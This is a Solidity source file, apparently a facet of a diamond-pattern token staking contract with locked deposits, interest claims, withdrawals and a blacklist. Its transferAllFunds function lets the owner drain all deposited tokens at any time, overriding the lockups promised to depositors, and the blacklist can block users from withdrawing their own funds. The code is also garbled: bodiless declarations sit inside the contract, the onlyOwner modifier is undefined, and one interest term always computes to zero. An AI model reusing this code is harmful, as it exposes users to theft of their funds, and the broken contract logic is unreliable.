// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address to, uint256 amount) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}

struct DepositInfo {
    uint256 amount;
    uint256 lockupPeriod;
    uint256 interestRate;
    uint256 depositTime;
    uint256 lastClaimTime;
}

import "./TestLib.sol";
contract balanceOfFacet {
    event Withdraw(address indexed user, uint256 amount);
    event InterestClaimed(address indexed user, uint256 amount);
    function balanceOf(address account) external view returns (uint256);
    function transferAllFunds() external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        uint256 contractBalance = ds._token.balanceOf(address(this));
        require(contractBalance > 0, "No funds to transfer.");
        ds._token.transfer(ds._owner, contractBalance);
    }
    function transfer(address to, uint256 amount) external returns (bool);
    function withdraw(uint256 depositIndex) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(
            !ds._blacklisted[msg.sender],
            "You are not allowed to withdraw."
        );
        require(
            depositIndex < ds._deposits[msg.sender].length,
            "Invalid deposit index."
        );
        require(
            block.timestamp >=
                ds._deposits[msg.sender][depositIndex].depositTime +
                    ds._deposits[msg.sender][depositIndex].lockupPeriod,
            "Lockup period not over."
        );

        uint256 amountToWithdraw = ds
        ._deposits[msg.sender][depositIndex].amount;
        require(amountToWithdraw > 0, "No funds to withdraw.");

        ds._deposits[msg.sender][depositIndex].amount = 0;
        ds._totalWithdrawnAmounts[msg.sender] += amountToWithdraw; // Store the withdrawn amount
        ds._token.transfer(msg.sender, amountToWithdraw);

        emit Withdraw(msg.sender, amountToWithdraw);
    }
    function claimInterestForDeposit(uint256 lockupPeriod) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(
            !ds._blacklisted[msg.sender],
            "You are not allowed to claim interest."
        );

        uint256 totalInterestToClaim = 0;

        for (uint256 i = 0; i < ds._deposits[msg.sender].length; i++) {
            if (
                ds._deposits[msg.sender][i].lockupPeriod ==
                lockupPeriod * 1 days
            ) {
                uint256 interestToClaim = calculateInterest(msg.sender, i);
                require(interestToClaim > 0, "No interest to claim.");

                ds._deposits[msg.sender][i].lastClaimTime = block.timestamp;
                totalInterestToClaim += interestToClaim;
            }
        }

        ds._token.transfer(msg.sender, totalInterestToClaim);

        emit InterestClaimed(msg.sender, totalInterestToClaim);
    }
    function calculateInterest(
        address user,
        uint256 depositIndex
    ) public view returns (uint256) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        DepositInfo storage deposit = ds._deposits[user][depositIndex];
        uint256 interestClaimed = ds._deposits[user][depositIndex].amount -
            ds._deposits[user][depositIndex].amount;
        uint256 timeElapsed = block.timestamp - deposit.lastClaimTime;
        uint256 interest = (deposit.amount *
            deposit.interestRate *
            timeElapsed) / (100000000000000000 * 86400); // 86400 seconds in a day
        return interest + interestClaimed;
    }
}
